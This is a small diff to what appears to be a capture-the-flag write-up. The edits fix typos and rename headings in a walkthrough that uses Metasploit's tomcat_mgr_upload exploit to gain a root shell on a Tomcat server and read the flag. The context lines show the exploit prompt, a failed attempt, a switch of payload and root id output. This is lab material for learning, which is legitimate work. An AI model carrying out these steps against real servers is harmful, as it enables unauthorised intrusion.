@@ -408,9 +408,9 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
 [*] Exploit completed, but no session was created.
 msf6 exploit(multi/http/tomcat_mgr_upload) > 
 ```
-Hhmm, for unknow reasons the exploit failed.
+Hhmm, for unknown reasons the exploit failed.
 
-Let's switch target and payload
+Let's switch target and payload and try again
 ```
 msf6 exploit(multi/http/tomcat_mgr_upload) > show targets
 
@@ -459,9 +459,9 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 We are running as root.
 
-### Get the root flag
+### Get the flag
 
-Finally, we locate and cat the root flag
+Finally, we locate and cat the flag
 ```bash
 cd /root
 ls -la
